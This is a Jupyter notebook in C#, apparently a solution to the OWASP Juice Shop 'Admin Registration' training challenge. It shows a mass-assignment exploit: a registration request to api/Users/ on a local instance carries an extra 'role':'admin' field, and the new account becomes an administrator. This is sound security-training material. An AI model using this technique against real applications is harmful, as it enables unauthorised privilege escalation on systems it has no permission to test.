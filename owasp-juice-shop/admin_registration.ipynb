{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "source": [
    "# Admin Registration\n",
    "\n",
    "Log in with the administrator's user credentials without previously changing them or applying SQL Injection.\n",
    "\n",
    "## Improper Input Validation\n",
    "The web site accepts properties specified by the user which shouldn't be allowed. In this case we can specify which role the user want's to be part of. \n",
    "\n",
    "### 1. Identify properties of user entities\n",
    "But first we need to find out which properties might be of interest. Let's try by start creating a standard user."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name userJson\n",
    "{\n",
    "    \"email\":\"userTest@test.se\",\n",
    "    \"password\":\"T3stT3st\",\n",
    "    \"passwordRepeat\":\"T3stT3st\",\n",
    "    \"securityQuestion\":{\n",
    "        \"id\":2,\n",
    "        \"question\":\"Mother's maiden name?\",\n",
    "        \"createdAt\":\"2022-02-10T18:22:42.379Z\",\n",
    "        \"updatedAt\":\"2022-02-10T18:22:42.379Z\"},\n",
    "    \"securityAnswer\":\"Test\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share userJson --from value\n",
    "\n",
    "using System.Net.Http;\n",
    "\n",
    "const string BASE_URL = \"http://localhost:3000\";\n",
    "var BASE_URI = new Uri(BASE_URL);\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var content = new StringContent(userJson, Encoding.UTF8, \"application/json\");\n",
    "    var uri = new Uri(BASE_URI, \"api/Users/\");\n",
    "    var response = await client.PostAsync(uri, content);\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2. Choose your own role\n",
    "And now we can try to create a user and specify a very specific role as 'admin' instead of 'customer'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name adminJson\n",
    "{\n",
    "    \"email\":\"adminTest@test.se\",\n",
    "    \"password\":\"T3stT3st\",\n",
    "    \"passwordRepeat\":\"T3stT3st\",\n",
    "    \"securityQuestion\":{\n",
    "        \"id\":2,\n",
    "        \"question\":\"Mother's maiden name?\",\n",
    "        \"createdAt\":\"2022-02-10T18:22:42.379Z\",\n",
    "        \"updatedAt\":\"2022-02-10T18:22:42.379Z\"},\n",
    "    \"securityAnswer\":\"Test\",\n",
    "    \"role\": \"admin\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share adminJson --from value\n",
    "\n",
    "using System.Net.Http;\n",
    "\n",
    "const string BASE_URL = \"http://localhost:3000\";\n",
    "var BASE_URI = new Uri(BASE_URL);\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var content = new StringContent(adminJson, Encoding.UTF8, \"application/json\");\n",
    "    var uri = new Uri(BASE_URI, \"api/Users/\");\n",
    "    var response = await client.PostAsync(uri, content);\n",
    "    response.EnsureSuccessStatusCode();\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
